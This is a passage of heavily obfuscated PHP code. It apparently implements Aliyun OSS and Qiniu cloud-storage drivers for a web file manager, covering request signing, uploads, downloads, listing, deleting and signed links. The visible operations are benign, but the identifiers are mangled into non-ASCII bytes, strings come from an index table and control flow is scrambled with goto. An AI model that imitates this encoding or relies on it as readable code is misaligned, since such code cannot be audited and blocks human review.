= array_merge(array($Bå„Š²²—¥[4]), $f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[1176]]); sort($dæµÉÀùŸ¸); $Bå„Š²²—¥[4] = implode($B„Şì¬ÚğÕ[214], $dæµÉÀùŸ¸); } $DÃŒù¬Îƒ = implode($B„Şì¬ÚğÕ[214], $Bå„Š²²—¥); $d¤öœÖ‡ª¥ = base64_encode(hash_hmac($B„Şì¬ÚğÕ[215], $DÃŒù¬Îƒ, $this->secret, !0)); goto AˆÖ½Ğ–‚ñ; B¸ÕµÒÄì‘: $CÔ±†ö‰º = $båöÌ…”ƒ; if (isset($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[88]])) { $CÔ±†ö‰º = $f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[88]]; unset($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[88]]); } if (isset($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[208]])) { return $this->listUploadParts($CÔ±†ö‰º, $aç‡å™Ä¿, $f¸¨›ÏÛ·); } goto d¿“ ÖÑ¬É; d´¡¥ Ú³: $B„Şì¬ÚğÕ =& $_SERVER[¿õñ]; $aç‡å™Ä¿ = isset($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[207]]) ? $f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[207]] : gmdate($B„Şì¬ÚğÕ[1174]); $FØä«çå¢Ÿ = isset($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[157]]) ? $f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[157]] : $B„Şì¬ÚğÕ[33]; goto B¸ÕµÒÄì‘; d¿“ ÖÑ¬É: $Bå„Š²²—¥ = array($B„Şì¬ÚğÕ[209], $B„Şì¬ÚğÕ[33], $B„Şì¬ÚğÕ[115], $aç‡å™Ä¿, "\x78\x2d\x6f\x73\x73\x2d\144\x61\164\145\72{$aç‡å™Ä¿}", $B„Şì¬ÚğÕ[8] . $this->bucket . $B„Şì¬ÚğÕ[8] . $CÔ±†ö‰º . $FØä«çå¢Ÿ); if (strpos($FØä«çå¢Ÿ, $B„Şì¬ÚğÕ[210]) === 0) { $Bå„Š²²—¥[0] = $B„Şì¬ÚğÕ[211]; if ($e¥÷¥ö‘®¸ = $this->trafficLimit($B„Şì¬ÚğÕ[1166])) { $CÔ±†ö‰º = $B„Şì¬ÚğÕ[1175]; array_splice($Bå„Š²²—¥, 5, 0, $CÔ±†ö‰º . $B„Şì¬ÚğÕ[4] . $e¥÷¥ö‘®¸[$CÔ±†ö‰º]); } } if (isset($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[212]]) && $f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[212]] == $B„Şì¬ÚğÕ[213]) { $Bå„Š²²—¥[0] = $B„Şì¬ÚğÕ[213]; } goto Fïê¡ÅùÖµ; AˆÖ½Ğ–‚ñ: $F÷½ØâØ‘ = $B„Şì¬ÚğÕ[1177] . $this->accessKey . $B„Şì¬ÚğÕ[4] . $d¤öœÖ‡ª¥; if (strpos($FØä«çå¢Ÿ, $B„Şì¬ÚğÕ[210]) === 0) { $F÷½ØâØ‘ = array($B„Şì¬ÚğÕ[217] => $F÷½ØâØ‘, $B„Şì¬ÚğÕ[207] => $aç‡å™Ä¿); if ($e¥÷¥ö‘®¸) { $F÷½ØâØ‘ = array_merge($F÷½ØâØ‘, $e¥÷¥ö‘®¸); } } return $F÷½ØâØ‘; goto AéôÏõ´ß¥; AéôÏõ´ß¥: } public function listUploadParts($Dæ•Ú¾¯¼à, $eç´Ş¥’, $EÔæ´Ğë’Ê) { goto cÂÖÔ†åˆ÷; cÂÖÔ†åˆ÷: $b‚´œöğ„‘ =& $_SERVER[¿õñ]; $d¦Ü”Úİãè = parse_url_query($EÔæ´Ğë’Ê[$b‚´œöğ„‘[157]]); $aÔ¸í¶Üï° = $this->client->listParts($this->bucket, $Dæ•Ú¾¯¼à, $d¦Ü”Úİãè[$b‚´œöğ„‘[206]]); goto b¸âôëîÈ; aœ‹ğ†¸ã: return array($b‚´œöğ„‘[217] => $bŞ’—¼±ï, $b‚´œöğ„‘[207] => $eç´Ş¥’, $b‚´œöğ„‘[219] => $B÷Å‰ŠÏ¿); goto bÌÈ½‰Ï¦Ò; e»×İ¤©ç: unset($EÔæ´Ğë’Ê[$b‚´œöğ„‘[208]], $EÔæ´Ğë’Ê[$b‚´œöğ„‘[212]]); $bŞ’—¼±ï = $this->multiUploadAuthData($Dæ•Ú¾¯¼à, $EÔæ´Ğë’Ê); if (empty($bŞ’—¼±ï)) { return !1; } goto aœ‹ğ†¸ã; b¸âôëîÈ: $D¦„Üğï = $aÔ¸í¶Üï°->getListPart(); $B÷Å‰ŠÏ¿ = array(); foreach ($D¦„Üğï as $D§ŒÓ˜ò—) { $B÷Å‰ŠÏ¿[] = array($b‚´œöğ„‘[1157] => $D§ŒÓ˜ò—->getPartNumber(), $b‚´œöğ„‘[1158] => trim($D§ŒÓ˜ò—->getETag(), $b‚´œöğ„‘[112])); } goto e»×İ¤©ç; bÌÈ½‰Ï¦Ò: } public function download($d‹ë›Œµîì, $aÁ¤ˆ–¾Àè) { if ($this->isFolder($d‹ë›Œµîì)) { return !1; } try { $eˆãä½Ëİœ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $aÁ¤ˆ–¾Àè); $eˆãä½Ëİœ = $this->trafficLimit($_SERVER[¿õñ][104], $eˆãä½Ëİœ); $this->client->getObject($this->bucket, $d‹ë›Œµîì, $eˆãä½Ëİœ); } catch (OSS\Core\OssException $dœ´ğ›Û¯â) { return !1; } return $aÁ¤ˆ–¾Àè; } public function fileSubstr($bÌêš´óè, $f„¼˜ñÀÃ¹ = 0, $B‰òñ¦çİŒ = false) { if ($f„¼˜ñÀÃ¹ === -1) { $Eë†¨¿ƒõÇ = array(); } else { if ($B‰òñ¦çİŒ === !1) { $FëŠˆ»Ä„å = $this->size($bÌêš´óè); } else { $FëŠˆ»Ä„å = $f„¼˜ñÀÃ¹ + $B‰òñ¦çİŒ - 1; } $Eë†¨¿ƒõÇ = array(OSS\OssClient::OSS_RANGE => "{$f„¼˜ñÀÃ¹}\55{$FëŠˆ»Ä„å}"); } try { return $this->client->getObject($this->bucket, $bÌêš´óè, $Eë†¨¿ƒõÇ); } catch (OSS\Core\OssException $d÷öô„ë¿«) { return !1; } } private function trafficLimit($cŸâ¸¶”±Å, $c÷‰ª„Ç = array()) { goto AÌÊšˆ…‚½; EæøĞó‰åÁ: if (!$A‰î‡”£ÆÆ) { return $c÷‰ª„Ç; } $A‰î‡”£ÆÆ = $A‰î‡”£ÆÆ < 819200 ? 819200 : ($A‰î‡”£ÆÆ > 838860800 ? 838860800 : $A‰î‡”£ÆÆ); $c÷‰ª„Ç[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A‰î‡”£ÆÆ); goto B·Ş¿‹´î¡; AÌÊšˆ…‚½: $aÚÀæêñãË =& $_SERVER[¿õñ]; if ($cŸâ¸¶”±Å == $aÚÀæêñãË[1166] && $GLOBALS[$aÚÀæêñãË[6]][$aÚÀæêñãË[84]][$aÚÀæêñãË[85]] || $cŸâ¸¶”±Å == $aÚÀæêñãË[104] && $GLOBALS[$aÚÀæêñãË[6]][$aÚÀæêñãË[84]][$aÚÀæêñãË[989]]) { return $c÷‰ª„Ç; } $A‰î‡”£ÆÆ = floatval($GLOBALS[$aÚÀæêñãË[6]][$aÚÀæêñãË[84]][$aÚÀæêñãË[90]][$cŸâ¸¶”±Å]) * 1024 * 1024 * 8; goto EæøĞó‰åÁ; B·Ş¿‹´î¡: return $c÷‰ª„Ç; goto CÙ´ãƒÊÔ; CÙ´ãƒÊÔ: } public function link($EòŸšßËë, $dôø½‘ïÀ = array()) { $AÈôô´ÆĞÆ =& $_SERVER[¿õñ]; if (!$this->exist($EòŸšßËë) || $this->isFolder($EòŸšßËë)) { return !1; } try { $dôø½‘ïÀ = $this->trafficLimit($AÈôô´ÆĞÆ[104], $dôø½‘ïÀ); $cæÕº²ÖØŞ = $this->client->signUrl($this->bucket, $EòŸšßËë, 3600 * 12, $AÈôô´ÆĞÆ[213], $dôø½‘ïÀ); return $cæÕº²ÖØŞ; } catch (OSS\Core\OssException $B¸ëÅØ˜Ğë) { return !1; } } public function fileOut($E…Ù‡£¡à, $C³¯Éâ«âÈ = false, $f‚§„’À²ã = false, $c°òó’ Š™ = '') { goto DÏÜ‡÷Ó›; DÏÜ‡÷Ó›: $D×°Š›–Œ« =& $_SERVER[¿õñ]; if (!$f‚§„’À²ã) { $f‚§„’À²ã = $this->pathThis($E…Ù‡£¡à); } $Eƒİ¾­„à÷ = get_file_mime(get_path_ext($f‚§„’À²ã)); goto AÙØ‘ø›ä§; AÙØ‘ø›ä§: if ($Eƒİ¾­„à÷ == $D×°Š›–Œ«[198]) { return parent::fileOut($E…Ù‡£¡à, $C³¯Éâ«âÈ, $f‚§„’À²ã, $c°òó’ Š™); } $C³¯Éâ«âÈ = $C³¯Éâ«âÈ ? $D×°Š›–Œ«[199] : $D×°Š›–Œ«[200]; $EÕŒó„ÉÂù = array(OSS\OssClient::OSS_SUB_RESOURCE => $D×°Š›–Œ«[1178] . rawurlencode("{$C³¯Éâ«âÈ}\73\146\x69\x6c\x65\156\x61\155\145\x3d{$f‚§„’À²ã}")); goto d¼‹è©Œ®‘; d¼‹è©Œ®‘: $EÕŒó„ÉÂù[OSS\OssClient::OSS_SUB_RESOURCE] .= $D×°Š›–Œ«[1179] . $Eƒİ¾­„à÷; $eÀøâ´…É = $this->link($E…Ù‡£¡à, $EÕŒó„ÉÂù); $this->fileOutLink($eÀøâ´…É); goto b…å¤†‹ÎË; b…å¤†‹ÎË: } public function fileOutServer($DŠÖ§í¢ù, $eŒºË†¹­é = false, $C˜Å†Õƒù = false, $bö£Ã‘ßåù = '') { parent::fileOut($DŠÖ§í¢ù, $eŒºË†¹­é, $C˜Å†Õƒù, $bö£Ã‘ßåù); } public function fileOutImage($DÔÀß¬‚ë, $aÙù…×÷Á = 250) { $fŒ—ÈÉ˜…É = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¿õñ][1180] . $aÙù…×÷Á); $E¬ …ßœì° = $this->link($DÔÀß¬‚ë, $fŒ—ÈÉ˜…É); $this->fileOutLink($E¬ …ßœì°); } public function fileOutImageServer($Fô¤Œ‚Òº, $fŠ„ÂÜ„ = 250) { parent::fileOutImage($Fô¤Œ‚Òº, $fŠ„ÂÜ„); } public function hashMd5($C¢³‡íÄÊ„, $eÀ¸ öµæá = '') { $dáõˆ»« =& $_SERVER[¿õñ]; $fò‰Ÿº©¸– = $this->objectMeta($C¢³‡íÄÊ„); if (!$fò‰Ÿº©¸–) { return $dáõˆ»«[33]; } if (!isset($fò‰Ÿº©¸–[$dáõˆ»«[1153]]) && !empty($eÀ¸ öµæá)) { $BùÌ¥…Ï‰ = $this->updateObjMeta($C¢³‡íÄÊ„, array($dáõˆ»«[1153] => $eÀ¸ öµæá)); $fò‰Ÿº©¸–[$dáõˆ»«[1153]] = $BùÌ¥…Ï‰ ? $eÀ¸ öµæá : $dáõˆ»«[33]; } return isset($fò‰Ÿº©¸–[$dáõˆ»«[1153]]) ? strtolower($fò‰Ÿº©¸–[$dáõˆ»«[1153]]) : $dáõˆ»«[33]; } public function size($FâÖÒâ—ˆ‹) { $bÈë¿éŞ­ = $this->objectMeta($FâÖÒâ—ˆ‹); return $bÈë¿éŞ­ ? $bÈë¿éŞ­[$_SERVER[¿õñ][78]] : 0; } public function info($Aä™öÀ¢ ‚) { if ($this->isFolder($Aä™öÀ¢ ‚)) { return $this->folderInfo($Aä™öÀ¢ ‚); } else { if ($this->isFile($Aä™öÀ¢ ‚)) { return $this->fileInfo($Aä™öÀ¢ ‚); } } return !1; } public function exist($c”š¿ßÀêÑ) { return $this->isFile($c”š¿ßÀêÑ) || $this->isFolder($c”š¿ßÀêÑ); } public function isFile($c—É…‘›) { return !$this->isFolder($c—É…‘›) && $this->objectMeta($c—É…‘›); } public function isFolder($e°©Œ†ˆÅ›) { return $this->cacheMehod($_SERVER[¿õñ][220], $e°©Œ†ˆÅ›); } protected function objectMeta($a¥Š•Ñ¤ ) { return $this->cacheMehod($_SERVER[¿õñ][221], $a¥Š•Ñ¤ ); } protected function _objectMeta($C´—Åóè’é) { $Bµ’×æã´ =& $_SERVER[¿õñ]; try { $AÊùØ’’ËÚ = $this->client->getObjectMeta($this->bucket, $C´—Åóè’é); } catch (OSS\Core\OssException $E¯Å—“Å³Ÿ) { $AÊùØ’’ËÚ = !1; } if ($AÊùØ’’ËÚ) { $AÊùØ’’ËÚ[$Bµ’×æã´[78]] = intval($AÊùØ’’ËÚ[$Bµ’×æã´[1160]]); } return $AÊùØ’’ËÚ; } protected function _isFolder($a¡ä°‹âˆ) { $dÍÜÙÛ·Š =& $_SERVER[¿õñ]; $d µŸÒÕ´¢ = array($dÍÜÙÛ·Š[1150] => $dÍÜÙÛ·Š[8], $dÍÜÙÛ·Š[183] => trim($a¡ä°‹âˆ, $dÍÜÙÛ·Š[8]) . $dÍÜÙÛ·Š[8], $dÍÜÙÛ·Š[1151] => 1, $dÍÜÙÛ·Š[1152] => $dÍÜÙÛ·Š[33]); $eö³‚ˆÂ¨ = $this->client->listObjects($this->bucket, $d µŸÒÕ´¢); if ($eö³‚ˆÂ¨->getObjectList() || $eö³‚ˆÂ¨->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public function __construct($D‘¡ˆ×Ï„â) { parent::__construct(); require_once SDK_DIR . $_SERVER[¿õñ][1181]; $this->_init($D‘¡ˆ×Ï„â); } public function _init($B´ˆÌ¾äÏ¡) { foreach ($B´ˆÌ¾äÏ¡ as $EÈŠ¡›ïÔ• => $D¡±ÉÚ÷¢¢) { if (isset($this->{$EÈŠ¡›ïÔ•})) { $this->{$EÈŠ¡›ïÔ•} = $D¡±ÉÚ÷¢¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¿õñ][1182], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($DÚ¾¥İÅáÕ, $e˜ÚŒĞ¢ˆ‹ = '', $f¶Ñœİì = REPEAT_RENAME) { if ($this->setContent($DÚ¾¥İÅáÕ, $e˜ÚŒĞ¢ˆ‹)) { return $this->getPathOuter($DÚ¾¥İÅáÕ); } return !1; } public function mkdir($C·æÂåì‚´, $céÅÀ‰‚Ê = REPEAT_SKIP) { goto FóÛõÅ»¡Â; FóÛõÅ»¡Â: $fµ—Á¼ïšÑ =& $_SERVER[¿õñ]; $Fî„äé‚¿ = trim($C·æÂåì‚´, $fµ—Á¼ïšÑ[8]); if ($this->_isFolder($Fî„äé‚¿)) { return $this->getPathOuter($Fî„äé‚¿); } goto CèµÊ³ïíº; EÎÕ­†İ…è: if (!$this->mkfile($fŒ¨ÖÁƒ¸Ï)) { return !1; } if (!$this->moveFile($fŒ¨ÖÁƒ¸Ï, $C·æÂåì‚´)) { $this->delFile($fŒ¨ÖÁƒ¸Ï); return !1; } return $this->getPathOuter($Fî„äé‚¿); goto D•ê“©ì‘¥; CèµÊ³ïíº: $C·æÂåì‚´ = $Fî„äé‚¿ . $fµ—Á¼ïšÑ[8]; $Cµ­Í£Šè = get_path_this($Fî„äé‚¿); $fŒ¨ÖÁƒ¸Ï = $C·æÂåì‚´ . $Cµ­Í£Šè; goto EÎÕ­†İ…è; D•ê“©ì‘¥: } public function copyFile($Dã»À‹Ò¸ã, $eòÆ…¶×˜Ğ) { $d»’¶½Ö¡‡ = $this->bucketManager->copy($this->bucket, $Dã»À‹Ò¸ã, $this->bucket, $eòÆ…¶×˜Ğ, !0); return $d»’¶½Ö¡‡ ? !1 : !0; } public function moveFile($d¯À†”íÈÜ, $B£¥›‡‚‚) { $aß¢ËÎŠ¹È = $this->bucketManager->move($this->bucket, $d¯À†”íÈÜ, $this->bucket, $B£¥›‡‚‚, !0); return $aß¢ËÎŠ¹È ? !1 : !0; } public function delFile($AÑ‚Öæ¶Ç•) { $b²áåšİä± = $this->bucketManager->delete($this->bucket, $AÑ‚Öæ¶Ç•); return $b²áåšİä± ? !1 : !0; } public function delFolder($Féà¥˜Œ£Ó) { $CäŸ×ôÅ = $this->fileList($Féà¥˜Œ£Ó); if (empty($CäŸ×ôÅ)) { return !0; } $eœĞ¦¡†ñ£ = 1000; if (count($CäŸ×ôÅ) <= $eœĞ¦¡†ñ£) { return $this->qnDelObj($CäŸ×ôÅ) ? !1 : !0; } foreach (array_chunk($CäŸ×ôÅ, $eœĞ¦¡†ñ£) as $D¾•¦«å‹Ä) { $d£¤Àø© = $this->qnDelObj($D¾•¦«å‹Ä); if ($d£¤Àø©) { return !1; } } return !0; } private function qnDelObj($f™÷‹íØØ—) { $e¤…Œ¼Ÿ“ó = $this->bucketManager->buildBatchDelete($this->bucket, $f™÷‹íØØ—); list($BÚœÏã«ËÉ, $fÀÏìÄà›Í) = $this->bucketManager->batch($e¤…Œ¼Ÿ“ó); return $fÀÏìÄà›Í; } private function fileList($b“ĞĞÆ¸éÌ, $b§äÔÛ§æ = 0) { goto FØíôİÇ–­; FÂÇ´î£¹¡: $fåÒŠ«±ºª = $D¼Ğó—åĞ[33]; $C­ÔÂÔÅ­ = 1000; $d‚Ì»†ß” = $D¼Ğó—åĞ[33]; goto bŒÛ·×“Í›; bŒÛ·×“Í›: $D®÷çªç­è = array(); while (!0) { list($Aª’æ²»Â, $bÆ¹Áçîæõ) = $this->bucketManager->listFiles($this->bucket, $AÅ¥ºµù‚Æ, $fåÒŠ«±ºª, $C­ÔÂÔÅ­, $d‚Ì»†ß”); if ($bÆ¹Áçîæõ) { return !1; } $fåÒŠ«±ºª = array_key_exists($D¼Ğó—åĞ[1152], $Aª’æ²»Â) ? $fåÒŠ«±ºª = $Aª’æ²»Â[$D¼Ğó—åĞ[1183]] : $D¼Ğó—åĞ[33]; foreach ($Aª’æ²»Â[$D¼Ğó—åĞ[1184]] as $c…¼ÎÍË×) { $f­œÌé½Ã = $c…¼ÎÍË×[$D¼Ğó—åĞ[88]]; if ($b§äÔÛ§æ) { $f­œÌé½Ã = array($D¼Ğó—åĞ[28] => $f­œÌé½Ã, $D¼Ğó—åĞ[78] => $c…¼ÎÍË×[$D¼Ğó—åĞ[1185]]); } $D®÷çªç­è[] = $f­œÌé½Ã; } if ($fåÒŠ«±ºª == $D¼Ğó—åĞ[33]) { break; } } return $D®÷çªç­è; goto cŞ¡ÖÒ ; FØíôİÇ–­: $D¼Ğó—åĞ =& $_SERVER[¿õñ]; $b“ĞĞÆ¸éÌ = trim($b“ĞĞÆ¸éÌ, $D¼Ğó—åĞ[8]); $AÅ¥ºµù‚Æ = empty($b“ĞĞÆ¸éÌ) ? $D¼Ğó—åĞ[33] : $b“ĞĞÆ¸éÌ . $D¼Ğó—åĞ[8]; goto FÂÇ´î£¹¡; cŞ¡ÖÒ : } public function rename($Cª‰öå”„¹, $D¡Ê›Éçå) { return $this->renameObject($Cª‰öå”„¹, $D¡Ê›Éçå); } public function fileInfo($BÀ£Ó¡Âì, $d÷¸áõØÛ† = false, $fá‡Ğ£ğ¥Ğ = array()) { goto B®Î…—’…; B®Î…—’…: $Dİ¿Ì£Œ =& $_SERVER[¿õñ]; if ($d÷¸áõØÛ†) { return array($Dİ¿Ì£Œ[28] => $this->pathThis($BÀ£Ó¡Âì), $Dİ¿Ì£Œ[76] => $this->getPathOuter($Dİ¿Ì£Œ[8] . $BÀ£Ó¡Âì), $Dİ¿Ì£Œ[29] => $Dİ¿Ì£Œ[164], $Dİ¿Ì£Œ[78] => isset($fá‡Ğ£ğ¥Ğ[$Dİ¿Ì£Œ[1185]]) ? $fá‡Ğ£ğ¥Ğ[$Dİ¿Ì£Œ[1185]] : 0, $Dİ¿Ì£Œ[157] => $this->ext($BÀ£Ó¡Âì)); } $BïËÏÔâ¼ = array($Dİ¿Ì£Œ[28] => $this->pathThis($BÀ£Ó¡Âì), $Dİ¿Ì£Œ[76] => $this->getPathOuter($Dİ¿Ì£Œ[8] . $BÀ£Ó¡Âì), $Dİ¿Ì£Œ[29] => $Dİ¿Ì£Œ[164], $Dİ¿Ì£Œ[184] => $Dİ¿Ì£Œ[50], $Dİ¿Ì£Œ[106] => $Dİ¿Ì£Œ[50], $Dİ¿Ì£Œ[78] => 0, $Dİ¿Ì£Œ[157] => $this->ext($BÀ£Ó¡Âì), $Dİ¿Ì£Œ[185] => !0, $Dİ¿Ì£Œ[186] => !0); goto eŠ‘î‰šò; eŠ‘î‰šò: if (empty($fá‡Ğ£ğ¥Ğ)) { $fá‡Ğ£ğ¥Ğ = $this->objectMeta($BÀ£Ó¡Âì); if (!$fá‡Ğ£ğ¥Ğ) { return $BïËÏÔâ¼; } } if (isset($fá‡Ğ£ğ¥Ğ[$Dİ¿Ì£Œ[1186]])) { $BïËÏÔâ¼[$Dİ¿Ì£Œ[184]] = $fá‡Ğ£ğ¥Ğ[$Dİ¿Ì£Œ[1186]]; } if (isset($fá‡Ğ£ğ¥Ğ[$Dİ¿Ì£Œ[1185]])) { $BïËÏÔâ¼[$Dİ¿Ì£Œ[78]] = $fá‡Ğ£ğ¥Ğ[$Dİ¿Ì£Œ[1185]]; } goto eÀñ»ôä·; eÀñ»ôä·: return $BïËÏÔâ¼; goto EÛ¹õˆ¡Ì†; EÛ¹õˆ¡Ì†: } public function folderInfo($BøÙİëùª, $C‚ïÒò¯ñÈ = false) { $F¡«È®È„Ë =& $_SERVER[¿õñ]; if ($C‚ïÒò¯ñÈ) { return array($F¡«È®È„Ë[28] => $this->pathThis($BøÙİëùª), $F¡«È®È„Ë[76] => $this->getPathOuter($F¡«È®È„Ë[8] . $BøÙİëùª), $F¡«È®È„Ë[29] => $F¡«È®È„Ë[77]); } $EƒéŒÆ·† = array($F¡«È®È„Ë[28] => $this->pathThis($BøÙİëùª), $F¡«È®È„Ë[76] => $this->getPathOuter($F¡«È®È„Ë[8] . $BøÙİëùª), $F¡«È®È„Ë[29] => $F¡«È®È„Ë[77], $F¡«È®È„Ë[184] => $F¡«È®È„Ë[50], $F¡«È®È„Ë[106] => $F¡«È®È„Ë[50], $F¡«È®È„Ë[1130] => !0, $F¡«È®È„Ë[1131] => !0); if (empty($fğË ñ‚¦)) { $BøÙİëùª = rtrim($BøÙİëùª, $F¡«È®È„Ë[8]) . $F¡«È®È„Ë[8]; $dŸ÷š³§ÊŒ = $this->objectMeta($BøÙİëùª); if (!$dŸ÷š³§ÊŒ) { return $EƒéŒÆ·†; } } if (isset($fğË ñ‚¦[$F¡«È®È„Ë[1186]])) { $EƒéŒÆ·†[$F¡«È®È„Ë[184]] = $fğË ñ‚¦[$F¡«È®È„Ë[1186]]; } return $EƒéŒÆ·†; } public function listPath($FŸ“¾Òë, $AÅª–áÜØÕ = false) { goto Eè×ê‰¼²Ÿ; B¿µÙ¿İøä: $F·°Æ‘¿­ğ = $c»íåã…‹›[33]; $AÂÜİã’¶˜ = 1000; $AİáÀ„ò›Ü = $c»íåã…‹›[8]; goto aî‹¨Ø®«¦; Eè×ê‰¼²Ÿ: $c»íåã…‹› =& $_SERVER[¿õñ]; $FŸ“¾Òë = trim($FŸ“¾Òë, $c»íåã…‹›[8]); $a®½Ç«ôõ = empty($FŸ“¾Òë) ? $c»íåã…‹›[33] : $FŸ“¾Òë . $c»íåã…‹›[8]; goto B¿µÙ¿İøä; aî‹¨Ø®«¦: $D¬Ë‚‹Êë = $d³“ğÕ¥ÕÑ = array(); while (!0) { list($a¯Ã‚Ì¯×Š, $D‹¯àÂå„) = $this->bucketManager->listFiles($this->bucket, $a®½Ç«ôõ, $F·°Æ‘¿­ğ, $AÂÜİã’¶˜, $AİáÀ„ò›Ü); if ($D‹¯àÂå„) { return !1; } $F·°Æ‘¿­ğ = array_key_exists($c»íåã…‹›[1152], $a¯Ã‚Ì¯×Š) ? $F·°Æ‘¿­ğ = $a¯Ã‚Ì¯×Š[$c»íåã…‹›[1183]] : $c»íåã…‹›[33]; if (isset($a¯Ã‚Ì¯×Š[$c»íåã…‹›[1187]])) { foreach ($a¯Ã‚Ì¯×Š[$c»íåã…‹›[1187]] as $cöÑ‹ ¾Èî) { if ($cöÑ‹ ¾Èî == $a®½Ç«ôõ) { continue; } $D¬Ë‚‹Êë[] = $this->folderInfo($cöÑ‹ ¾Èî, $AÅª–áÜØÕ); } } if (isset($a¯Ã‚Ì¯×Š[$c»íåã…‹›[1184]])) { foreach ($a¯Ã‚Ì¯×Š[$c»íåã…‹›[1184]] as $DÌã¶¼°ï‡) { if ($DÌã¶¼°ï‡[$c»íåã…‹›[88]] == $a®½Ç«ôõ) { continue; } $d³“ğÕ¥ÕÑ[] = $this->fileInfo($DÌã¶¼°ï‡[$c»íåã…‹›[88]], $AÅª–áÜØÕ, $DÌã¶¼°ï‡); } } if ($F·°Æ‘¿­ğ == $c»íåã…‹›[33]) { break; } } return array($c»íåã…‹›[75] => $D¬Ë‚‹Êë, $c»íåã…‹›[74] => $d³“ğÕ¥ÕÑ); goto D…àË›øğâ; D…àË›øğâ: } public function has($fÃŒÁÀ“’¬, $B°ğ­‚„” = false, $E™ì£‹Ã½Á = true) { goto D×Ğ‰îÉÕè; CÈ‹›’’º·: if ($B°ğ­‚„”) { return array($e®ŒÏ°ƒà©[188] => $B°Œ¥ãšùë, $e®ŒÏ°ƒà©[189] => $cÜ©‰ßåéˆ); } return !1; goto DÀÜ¬ëÑÌ¸; f­¼½óÉ‹: $B°Œ¥ãšùë = 0; $cÜ©‰ßåéˆ = 0; while (!0) { list($Fç‹áóÔÂá, $AªĞ¦ã·İˆ) = $this->bucketManager->listFiles($this->bucket, $b¸½µšàè·, $EÚÏé±Ä, $F ˜çŞĞËÈ, $C–ŒØ³’™ê); if ($AªĞ¦ã·İˆ) { return !1; } $EÚÏé±Ä = array_key_exists($e®ŒÏ°ƒà©[1152], $Fç‹áóÔÂá) ? $EÚÏé±Ä = $Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1183]] : $e®ŒÏ°ƒà©[33]; if ($B°ğ­‚„”) { if (!empty($Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1184]])) { $B°Œ¥ãšùë += count($Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1184]]); } if (!empty($Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1187]])) { $cÜ©‰ßåéˆ += count($Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1187]]); } if ($EÚÏé±Ä === $e®ŒÏ°ƒà©[33]) { break; } continue; } if ($E™ì£‹Ã½Á) { if (!empty($Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1184]])) { return !0; } } else { if (!empty($Fç‹áóÔÂá[$e®ŒÏ°ƒà©[1187]])) { return !0; } } if ($EÚÏé±Ä == $e®ŒÏ°ƒà©[33]) { break; } } goto CÈ‹›’’º·; D×Ğ‰îÉÕè: $e®ŒÏ°ƒà© =& $_SERVER[¿õñ]; $fÃŒÁÀ“’¬ = trim($fÃŒÁÀ“’¬, $e®ŒÏ°ƒà©[8]); $b¸½µšàè· = empty($fÃŒÁÀ“’¬) ? $e®ŒÏ°ƒà©[33] : $fÃŒÁÀ“’¬ . $e®ŒÏ°ƒà©[8]; goto aç¡ß™©Ã; aç¡ß™©Ã: $EÚÏé±Ä = $e®ŒÏ°ƒà©[33]; $F ˜çŞĞËÈ = 1000; $C–ŒØ³’™ê = $e®ŒÏ°ƒà©[8]; goto f­¼½óÉ‹; DÀÜ¬ëÑÌ¸: } public function listAll($F¢ÈÅåãùÔ) { $Cø¿º£êÁœ =& $_SERVER[¿õñ]; $däØ¼ç¤ì¼ = $this->fileList($F¢ÈÅåãùÔ, 1); $c™Ê»••®ˆ = array(); foreach ($däØ¼ç¤ì¼ as $e­î ©—À) { $c™Ê»••®ˆ[$e­î ©—À[$Cø¿º£êÁœ[28]]] = $e­î ©—À[$Cø¿º£êÁœ[78]]; } return $this->listAllFiles($F¢ÈÅåãùÔ, array_keys($c™Ê»••®ˆ), $c™Ê»••®ˆ); } public function canRead($fŸÊ½©º†©) { return $this->exist($fŸÊ½©º†©) ? !0 : !1; } public function canWrite($eîŒÓ›ŸŞœ) { return $this->exist($eîŒÓ›ŸŞœ) ? !0 : !1; } public function getContent($D±îßßö‡Ç) { return $this->fileSubstr($D±îßßö‡Ç, 0, -1); } public function setContent($A×šÁ¸àÏ¨, $D¨µ³¼ğˆ½ = '') { $a†Óœ›ÛÃÚ = $this->tempFile($this->pathThis($A×šÁ¸àÏ¨)); file_put_contents($a†Óœ›ÛÃÚ, $D¨µ³¼ğˆ½); if ($this->upload($A×šÁ¸àÏ¨, $a†Óœ›ÛÃÚ)) { $this->tempFileRemve($a†Óœ›ÛÃÚ); return !0; } return !1; } public function refreshUrls($EÜ†¤õá³é) { goto Cî®âÀŠ„Ê; b²Óé‡×í˜: return $D÷§èÂØ½õ[$eÕÆê¶ºî[1188]] == $eÕÆê¶ºî[693] ? !0 : !1; goto D‹ÌÉš¿“‰; AĞÀ† ó§Û: $e½øï®ÆßĞ = new Qiniu\Cdn\CdnManager($this->auth); list($D÷§èÂØ½õ, $B¨§ÅÇ¹»Ø) = $e½øï®ÆßĞ->refreshUrls($bĞ°™ÀÄº‰); if ($B¨§ÅÇ¹»Ø) { 